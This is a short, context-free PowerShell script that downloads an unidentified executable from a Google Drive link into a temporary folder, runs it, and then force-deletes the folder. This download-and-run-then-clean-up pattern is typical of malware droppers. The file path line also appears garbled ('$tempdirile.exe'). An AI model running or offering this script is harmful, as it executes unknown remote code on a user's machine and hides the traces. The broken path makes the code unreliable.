& {
    $url = "https://drive.usercontent.google.com/u/0/uc?id=1IxYhViN79H065b_BJnAiA-Wxf14w9FoK&export=download"
    $tempdir = "$env:TEMP\$(New-Guid)"
    mkdir $tempdir | Out-Null
    $file = "$tempdirile.exe"
    
    try {
        (irm -Uri $url -OutFile $file -ErrorAction Stop)
        $proc = Start-Process $file -PassThru -Wait
        "Process exited with code: $($proc.ExitCode)"
    }
    finally {
        ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue
    }
}
